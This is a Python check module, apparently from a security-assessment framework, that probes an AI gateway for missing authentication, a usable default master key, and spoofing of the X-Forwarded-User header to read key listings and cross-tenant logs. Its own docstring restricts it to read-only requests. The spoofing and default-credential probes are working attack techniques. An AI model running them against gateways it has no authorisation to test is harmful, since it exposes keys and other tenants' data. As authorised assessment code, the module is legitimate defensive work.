"""aigateway-auth-bypass — 默认凭据 + X-Forwarded-User 伪造越权。

Ruling：只做推理面（只读 ping）与 /key/info、/logs 读取；不调用 /key/generate 等写面。
"""
from __future__ import annotations

import importlib.util
from pathlib import Path

_PARENT = Path(__file__).resolve().parent.parent
_SPEC = importlib.util.spec_from_file_location("_aigateway_common", _PARENT / "_aigateway-common.py")
_COMMON = importlib.util.module_from_spec(_SPEC)
_SPEC.loader.exec_module(_COMMON)

KEY = "aigateway-auth-bypass"
WRITES = False
Trace, finding = _COMMON.Trace, _COMMON.finding
bearer, master_key, tenant_key = _COMMON.bearer, _COMMON.master_key, _COMMON.tenant_key
ok, resp, status = _COMMON.ok, _COMMON.resp, _COMMON.status
spoof_user, target = _COMMON.spoof_user, _COMMON.target

PROBE_BODY = {"model": "gpt-4o", "messages": [{"role": "user", "content": "inkblade-auth-probe"}]}


def run(ctx: dict, params: dict) -> dict:
    base = target(params)
    if not base:
        return {"summary": "no-target", "artifacts": [], "findings": []}
    master = master_key(params)
    tenant = tenant_key(params)
    spoof = spoof_user(params)
    spoof_headers = {"X-Forwarded-User": spoof}

    t = Trace(ctx, KEY)
    chat_anon = t.call("POST", f"{base}/v1/chat/completions", PROBE_BODY)
    chat_master = t.call("POST", f"{base}/v1/chat/completions", PROBE_BODY, bearer(master))
    chat_wrong = t.call("POST", f"{base}/v1/chat/completions", PROBE_BODY,
                        bearer("MOCK-wrong-key-deadbeef"))
    info_spoof = t.call("GET", f"{base}/key/info", headers=spoof_headers)
    info_tenant_spoof = t.call("GET", f"{base}/key/info",
                               headers={**bearer(tenant), **spoof_headers})
    logs_spoof = t.call("GET", f"{base}/logs", headers=spoof_headers)

    findings: list[dict] = []
    default_credential = ok(chat_master) and not ok(chat_wrong)
    if ok(chat_anon) or default_credential:
        title = ("AI 网关推理面无鉴权：/v1/chat/completions 匿名可调用" if ok(chat_anon)
                 else "AI 网关默认 master key 可用：默认凭据直达推理面")
        detail = {
            "route": "/v1/chat/completions",
            "statuses": {"anonymous": status(chat_anon), "default_master_key": status(chat_master),
                         "wrong_key": status(chat_wrong)},
            "unauthenticated": ok(chat_anon),
            "default_master_key_usable": default_credential,
            "wrong_key_rejected": not ok(chat_wrong),
            "note": "默认凭据/匿名可调用推理面：可耗尽配额、盗用上游额度并作为凭据链入口",
        }
        findings.append(finding("high", title, detail))

    info_payload = resp(info_spoof)
    if ok(info_spoof) and info_payload.get("scope") == "global":
        detail = {
            "route": "/key/info",
            "impersonated_user": spoof,
            "subject": info_payload.get("subject"),
            "scope": info_payload.get("scope"),
            "visible_tenants": info_payload.get("visible_tenants"),
            "master_key_present": bool(info_payload.get("master_key")),
            "tenant_key_with_spoof_status": status(info_tenant_spoof),
            "note": "X-Forwarded-User 被网关直接采信：匿名请求即可获得 admin 全局视图",
        }
        findings.append(finding("high", "伪造 X-Forwarded-User 越权：/key/info 返回全局 key 清单", detail))

    entries = resp(logs_spoof).get("entries") or []
    tenants = sorted({str(e.get("tenant")) for e in entries})
    if ok(logs_spoof) and len(tenants) > 1:
        detail = {
            "route": "/logs",
            "impersonated_user": spoof,
            "tenants_visible": tenants,
            "entry_count": len(entries),
            "note": "伪造代理身份头读取全租户请求日志：跨租户数据泄露",
        }
        findings.append(finding("high", "伪造 X-Forwarded-User 越权：/logs 返回全租户明文日志", detail))

    artifact = t.dump()
    summary = (f"chat[anon={status(chat_anon)} master={status(chat_master)} "
               f"wrong={status(chat_wrong)}] key_info_spoof={status(info_spoof)} "
               f"logs_spoof={status(logs_spoof)} findings={len(findings)}")
    return {"summary": summary, "artifacts": [str(artifact)], "findings": findings}
